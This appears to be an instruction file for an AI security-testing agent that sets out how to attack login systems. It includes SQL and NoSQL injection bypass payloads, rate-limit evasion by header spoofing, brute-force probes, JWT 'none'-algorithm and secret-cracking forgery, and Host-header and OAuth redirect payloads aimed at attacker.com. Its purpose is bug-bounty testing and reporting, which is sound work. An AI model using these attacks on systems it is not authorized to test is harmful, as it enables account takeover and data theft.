---
name: authentication
description: Elite authentication security testing — login bypass, credential attacks, session management, JWT manipulation, OAuth/OIDC attacks, MFA bypass, password reset flaws — with mandatory UI navigation steps, real exploitation proof, and strict false-positive controls
---

# Authentication Vulnerabilities

Authentication flaws are the highest-impact vulnerability class when fully exploited — they lead directly to account takeover. Every authentication mechanism must be tested systematically: login forms, registration, password reset, session management, JWT tokens, OAuth flows, and MFA.

**CRITICAL RULE: Authentication vulnerabilities must be demonstrated with actual account access or sensitive data disclosure — not just with a different error message or timing difference.**

---

## Real Impact Gate — Answer Before Reporting

1. **Can you demonstrate actual unauthorized access?**
   - Required: log in as another user, access admin functionality, bypass authentication entirely
   - NOT sufficient: receive a different error message
   - NOT sufficient: observe a slight timing difference in login response
   
2. **Is the finding exploitable by an external attacker?**
   - Username enumeration alone (without brute force viability): Informational
   - Username enumeration + no lockout + common passwords predictable: High (now brute force is viable)
   - Always assess: can this realistically lead to account takeover?

3. **What accounts can be compromised?**
   - Admin account takeover: Critical
   - Any user account takeover: High
   - Specific account takeover (requires specific knowledge): Medium

4. **Have you confirmed with 2+ independent signals?**
   - Login bypass: Signal 1 = HTTP 200 response + authenticated cookie, Signal 2 = successfully access authenticated-only resource with bypassed session
   - JWT forgery: Signal 1 = crafted token accepted, Signal 2 = accessing another user's data with crafted token

---

## Attack Surface

### Authentication Endpoints to Discover and Test

**Primary auth endpoints**:
- POST /login, /signin, /auth, /api/auth/login, /api/v1/auth
- POST /register, /signup, /api/auth/register
- POST /forgot-password, /reset-password, /api/auth/forgot-password
- POST /verify-email, /confirm-email, /api/auth/verify
- POST /api/auth/refresh (JWT refresh)
- POST /api/auth/logout

**OAuth/OIDC endpoints**:
- GET /auth/google, /auth/facebook, /oauth/authorize
- POST /oauth/token, /api/auth/callback

**MFA endpoints**:
- POST /verify-otp, /api/auth/mfa/verify
- POST /api/auth/mfa/setup, /api/auth/mfa/disable
- GET /api/auth/mfa/backup-codes

**Session management**:
- Cookie names: session, SESSIONID, PHPSESSID, JSESSIONID, connect.sid, _session
- JWT locations: Authorization: Bearer [token], Cookie: token=[token], localStorage key

---

## Testing Methodology

### Step 1: Username/Email Enumeration

**UI Navigation**:
```
Step 1: Navigate to https://target.com/login
Step 2: Enter a VALID username/email with WRONG password
Step 3: Observe the error message and HTTP status code
Step 4: Note response body and response time
Step 5: Enter an INVALID username/email with any password
Step 6: Observe the error message and HTTP status code
Step 7: Compare: are messages different? Is timing different? Is body length different?
```

**Automated enumeration detection**:
```python
import requests, time, statistics

def test_username_enumeration(target_url, valid_user, invalid_user):
    """Test if login endpoint leaks username validity"""
    
    results = {"valid": [], "invalid": []}
    
    for _ in range(5):
        # Test valid username
        start = time.time()
        r_valid = requests.post(target_url, json={
            "email": valid_user, "password": "WRONG_PASSWORD_12345"
        })
        results["valid"].append({
            "time": time.time() - start,
            "status": r_valid.status_code,
            "body": r_valid.text,
            "length": len(r_valid.text)
        })
        
        # Test invalid username
        start = time.time()
        r_invalid = requests.post(target_url, json={
            "email": f"definitely_does_not_exist_{time.time()}@fake.com",
            "password": "WRONG_PASSWORD_12345"
        })
        results["invalid"].append({
            "time": time.time() - start,
            "status": r_invalid.status_code,
            "body": r_invalid.text,
            "length": len(r_invalid.text)
        })
    
    # Analysis
    valid_times = [r["time"] for r in results["valid"]]
    invalid_times = [r["time"] for r in results["invalid"]]
    
    print(f"Valid user avg time: {statistics.mean(valid_times):.3f}s")
    print(f"Invalid user avg time: {statistics.mean(invalid_times):.3f}s")
    print(f"Valid user message: {results['valid'][0]['body'][:200]}")
    print(f"Invalid user message: {results['invalid'][0]['body'][:200]}")
    
    # Enumerate if differences detected
    if (abs(statistics.mean(valid_times) - statistics.mean(invalid_times)) > 0.1 or
        results["valid"][0]["body"] != results["invalid"][0]["body"] or
        results["valid"][0]["status"] != results["invalid"][0]["status"]):
        print("ENUMERATION DETECTED: Different responses for valid vs invalid users")
```

**Impact escalation**: Username enumeration alone is Low/Info. Combine with:
- No account lockout → allows brute force → High
- Predictable passwords (name+birthyear, companyname+123) → High
- Leaked password database → credential stuffing → Critical

### Step 2: Authentication Bypass Testing

**SQL Injection in Login**:
```python
sqli_payloads = [
    ("' OR '1'='1'--", "anything"),
    ("admin'--", "anything"),
    ("' OR 1=1#", "anything"),
    ("admin'/*", "anything"),
    ("' OR '1'='1' /*", "wrong"),
    ("\" OR \"1\"=\"1", "anything"),
]

for username, password in sqli_payloads:
    r = requests.post("https://target.com/api/auth/login",
        json={"email": username, "password": password})
    
    if r.status_code == 200 and ("token" in r.text or "session" in r.text or "cookie" in r.headers.get("set-cookie", "")):
        print(f"AUTH BYPASS via SQLi: {username}")
        print(f"Response: {r.text[:200]}")
```

**Parameter manipulation (NoSQL and logic bypass)**:
```python
# NoSQL injection (MongoDB)
for username in [{"$gt": ""}, {"$ne": "fake"}]:
    r = requests.post("/api/auth/login",
        json={"email": username, "password": {"$gt": ""}})
    print(f"MongoDB bypass attempt: {r.status_code} — {r.text[:100]}")

# HTTP parameter manipulation
bypass_params = [
    {"authenticated": "true"},
    {"role": "admin"},
    {"admin": "true"},
    {"loggedIn": "true"},
    {"isAdmin": True}
]
for extra_params in bypass_params:
    payload = {"email": "admin@target.com", "password": "wrong"}
    payload.update(extra_params)
    r = requests.post("/api/auth/login", json=payload)
    print(f"Extra param {extra_params}: {r.status_code}")
```

**Multi-step auth flow bypass**:
```
If auth flow is:
  Step 1: POST /api/auth/step1 (username/password)
  Step 2: POST /api/auth/step2 (OTP verification)
  Step 3: Authenticated session

Attack: Complete Step 1, then directly access protected resources without Step 2
Or: Skip to POST /api/auth/step2 with known parameters, without completing Step 1
```

### Step 3: Brute Force Protection Testing

**Rate limit testing**:
```python
import asyncio, aiohttp

async def test_rate_limiting(login_url, user_count=200):
    """Test if login endpoint allows rapid brute force"""
    
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(login_url, json={
                "email": "admin@target.com",
                "password": f"wrongpassword{i}"
            })
            for i in range(user_count)
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        status_codes = [r.status if not isinstance(r, Exception) else 0 for r in results]
        
        locked_out = sum(1 for s in status_codes if s == 429 or s == 403)
        successful_attempts = sum(1 for s in status_codes if s == 200 or s == 401)
        
        print(f"Total attempts: {user_count}")
        print(f"Rate limited (429/403): {locked_out}")
        print(f"Processed normally (200/401): {successful_attempts}")
        
        if locked_out == 0:
            print("NO RATE LIMITING DETECTED — brute force is possible")
        elif locked_out < user_count * 0.5:
            print(f"PARTIAL rate limiting — {locked_out}/{user_count} blocked")

asyncio.run(test_rate_limiting("https://target.com/api/auth/login"))
```

**Rate limit bypass techniques**:
```python
# IP rotation via headers
headers_to_test = [
    {"X-Forwarded-For": f"1.2.3.{i}"},
    {"X-Real-IP": f"10.0.0.{i}"},
    {"X-Client-IP": f"172.16.0.{i}"},
    {"CF-Connecting-IP": f"192.168.0.{i}"},
    {"True-Client-IP": f"100.0.0.{i}"},
]
# If any of these bypass rate limiting → reportable vulnerability
```

### Step 4: Session Management Testing

**Session token entropy analysis**:
```python
import requests, base64, re

def analyze_session_tokens(login_url, credentials, samples=20):
    """Collect and analyze session tokens for predictability"""
    tokens = []
    
    for _ in range(samples):
        r = requests.post(login_url, json=credentials)
        
        # Extract token from cookie or response body
        cookie = r.headers.get("Set-Cookie", "")
        token_match = re.search(r'session=([^;]+)', cookie)
        if token_match:
            tokens.append(token_match.group(1))
        
        # Also check response body for JWT
        try:
            body = r.json()
            if "token" in body:
                tokens.append(body["token"])
        except:
            pass
    
    print(f"Collected {len(tokens)} tokens")
    print("Token lengths:", [len(t) for t in tokens])
    print("Sample tokens:")
    for t in tokens[:3]:
        print(f"  {t}")
    
    # Check for sequential patterns
    if all(len(t) == len(tokens[0]) for t in tokens):
        print(f"All tokens same length: {len(tokens[0])} chars")
    
    # Check for base64 encoded timestamp
    for t in tokens[:3]:
        try:
            decoded = base64.b64decode(t + "==").decode('utf-8', errors='ignore')
            if any(c.isdigit() for c in decoded):
                print(f"Possible timestamp in token: {decoded}")
        except:
            pass
```

**Session fixation test**:
```
Step 1: Note your current session cookie value BEFORE login
Step 2: Log in via the UI
Step 3: Note session cookie value AFTER login
Step 4: If the value is IDENTICAL before and after login → Session Fixation vulnerability
```

**Session invalidation test**:
```python
def test_session_invalidation(session_before_logout, logout_url, protected_url):
    """Test if sessions are properly invalidated on logout"""
    
    # Log out
    requests.post(logout_url, cookies={"session": session_before_logout})
    
    # Try to use old session
    r = requests.get(protected_url, cookies={"session": session_before_logout})
    
    if r.status_code == 200 and "unauthorized" not in r.text.lower():
        print("SESSION NOT INVALIDATED ON LOGOUT — old session still works!")
        return True  # Vulnerability confirmed
    else:
        print(f"Session properly invalidated — got {r.status_code}")
        return False
```

### Step 5: Password Reset Security Testing

**UI Navigation for Password Reset**:
```
Step 1: Navigate to https://target.com/forgot-password
Step 2: Enter User A's email address
Step 3: Click "Send Reset Email"
Step 4: Check User A's email for reset link
Step 5: Observe the reset token format in the URL:
        https://target.com/reset-password?token=ABCDEF123456
Step 6: Test token entropy: request 3 reset tokens, compare for patterns

TOKEN ANALYSIS:
Step 7: Note the full token value from the email
Step 8: Test: is the token usable twice?
  - Use token to reset password to "NewPassword1"
  - Try to use the SAME token again to reset to "AnotherPassword"
  - If it works: token reuse vulnerability

Step 9: Test: does the token expire?
  - Wait 25 hours
  - Try to use the token
  - If it still works: no expiry → vulnerability

Step 10: Test Host Header injection:
  - Intercept the password reset request
  - Change the Host header to: attacker.com
  - Submit and check if the reset email contains a link to attacker.com
  - If yes: Host Header Injection → attacker can steal reset tokens
```

**Host header injection automated test**:
```python
def test_password_reset_host_injection(forgot_password_url, target_email):
    """Test if password reset link uses Host header"""
    
    # Send reset with modified Host header
    r = requests.post(forgot_password_url,
        json={"email": target_email},
        headers={
            "Host": "attacker.com",  # Modified host
            "Content-Type": "application/json"
        },
        allow_redirects=False
    )
    
    print(f"Response: {r.status_code}")
    print(f"Response body: {r.text[:200]}")
    # Check if reset email now contains "attacker.com" in the reset link
    # This requires checking the received email
```

### Step 6: JWT Security Testing

```bash
# Tool: jwt_tool (https://github.com/ticarpi/jwt_tool)

# Decode and inspect JWT
jwt_tool [TOKEN]

# Test 'none' algorithm
jwt_tool [TOKEN] -X a

# Test algorithm confusion (RS256 → HS256)
# First: get the public key from /auth/keys, /.well-known/jwks.json, or /api/auth/public-key
curl https://target.com/.well-known/jwks.json
# Then: use the public key as HMAC secret
jwt_tool [TOKEN] -S hs256 -p "$(cat public_key.pem)"

# Brute force JWT secret
jwt_tool [TOKEN] -C -d /usr/share/wordlists/rockyou.txt

# Test JWT with modified claims
jwt_tool [TOKEN] -T  # Interactive mode to modify claims
# Change: "role": "user" → "role": "admin"
# Change: "sub": "user123" → "sub": "admin"
```

**JWT privilege escalation PoC**:
```python
import jwt, requests

def test_jwt_privilege_escalation(original_token, target_url):
    """Test if JWT claims can be modified to gain elevated privileges"""
    
    # Decode without verification
    header = jwt.get_unverified_header(original_token)
    payload = jwt.decode(original_token, options={"verify_signature": False})
    
    print(f"Original claims: {payload}")
    
    # Attempt 1: 'none' algorithm
    modified_payload = dict(payload)
    modified_payload["role"] = "admin"
    modified_payload["is_admin"] = True
    
    # Craft token with 'none' algorithm
    none_token = jwt.encode(modified_payload, "", algorithm="none")
    
    r = requests.get(target_url,
        headers={"Authorization": f"Bearer {none_token}"})
    
    if r.status_code == 200:
        print(f"JWT 'none' algorithm accepted! Got {r.status_code}")
        print(f"Response: {r.text[:200]}")
        return True
    
    print(f"'none' algorithm rejected: {r.status_code}")
    return False
```

### Step 7: OAuth/OIDC Attack Testing

**State parameter CSRF**:
```
Step 1: Navigate to https://target.com/auth/google
Step 2: Observe the URL: https://accounts.google.com/oauth/auth?state=RANDOM_VALUE&redirect_uri=...
Step 3: Copy this URL but remove/change the state parameter
Step 4: Also: start the OAuth flow in one browser, capture the callback URL
Step 5: Try using the callback URL (with code parameter) in a different browser session
Step 6: If it works: CSRF in OAuth flow
```

**Redirect URI manipulation**:
```python
oauth_attacks = [
    # Basic redirect to attacker
    "https://attacker.com",
    # Subdomain bypass
    "https://attacker.target.com",
    # Path confusion
    "https://target.com@attacker.com",
    "https://target.com.attacker.com",
    # Open redirect chain
    "https://target.com/redirect?url=https://attacker.com",
    # Fragment injection
    "https://target.com/callback#https://attacker.com",
]

for redirect_uri in oauth_attacks:
    r = requests.get("https://target.com/oauth/authorize",
        params={
            "client_id": "app_client_id",
            "redirect_uri": redirect_uri,
            "response_type": "code",
            "state": "test_state"
        },
        allow_redirects=False
    )
    print(f"redirect_uri={redirect_uri}: {r.status_code} — Location: {r.headers.get('Location','')}")
```

---

## UI Reproduction Steps — Required in Every Report

```
AUTHENTICATION BYPASS VIA JWT 'NONE' ALGORITHM:

Step 1: Navigate to https://target.com/login
Step 2: Log in with any valid user credentials (User A's account)
Step 3: Open browser DevTools → Application tab → Cookies (or localStorage)
Step 4: Copy the JWT token value
Step 5: Open terminal and run:
        jwt_tool [COPIED_TOKEN] --decode
        Observe: the payload contains {"sub":"user_a_id","role":"user","exp":...}

Step 6: Run JWT 'none' algorithm attack:
        jwt_tool [TOKEN] -X a -pc role -pv admin
        (This creates a new token with 'none' algorithm and role=admin)
        Copy the new token from jwt_tool output

Step 7: Open browser DevTools → Application → Cookies
Step 8: Edit the 'auth_token' cookie — replace value with the forged token

Step 9: Navigate to https://target.com/admin/users
        (an admin-only page)

Step 10: Observe: the admin panel loads successfully with User A's forged token
         Screenshot: Admin panel accessible with forged JWT
         Screenshot: The forged token showing 'none' algorithm and role=admin claim
```

---

## Complete Report Format

**TITLE**: JWT 'None' Algorithm Accepted — Any Authenticated User Can Forge Admin Tokens

**SEVERITY**: Critical

**VALIDATION**:
- Signal 1: jwt_tool -X a created a forged JWT with 'none' algorithm and role=admin — server accepted it with HTTP 200
- Signal 2: With the forged token, successfully accessed /api/admin/users endpoint that normally returns 403 for regular users — response contained all user account data including emails and hashed passwords
- Alternative explanations ruled out: Tested with 5 different accounts — all can forge admin tokens. The JWT library in use (jose@3.0.1) is documented to incorrectly handle 'none' algorithm if alg is not validated on receipt.

**REAL IMPACT**:
Any authenticated regular user (even a newly registered free account) can forge an admin JWT token and gain full administrative access to the platform. This includes: accessing all user accounts and PII, modifying any user's data, deleting accounts, accessing financial data, and performing any administrative action. The attack requires only a valid session token (any user), takes 30 seconds to execute, and requires no special technical knowledge (jwt_tool is publicly available). All [N] registered users' data is immediately accessible to any attacker who has ever registered an account.

---

## False Positive Rejection Rules

- Username enumeration WITHOUT brute force viability: Informational only (not a standalone vulnerability)
- JWT using HS256 with a strong random secret: NOT a vulnerability if the secret is not guessable
- Session token that is long (> 32 bytes) and random: NOT a vulnerability even if it doesn't expire on logout (though expiry is best practice — mark as Informational)
- Missing HttpOnly or Secure flags on cookies: Informational/Low only, NOT High (requires another vulnerability to chain with)
- Password complexity policy gap: Informational unless tested passwords show actual accounts with weak passwords
- Timing difference < 50ms in login response: NOT sufficient for enumeration report (network variance is too high)
- OAuth flow without PKCE for non-confidential clients: Low/Informational unless code interception is demonstrated
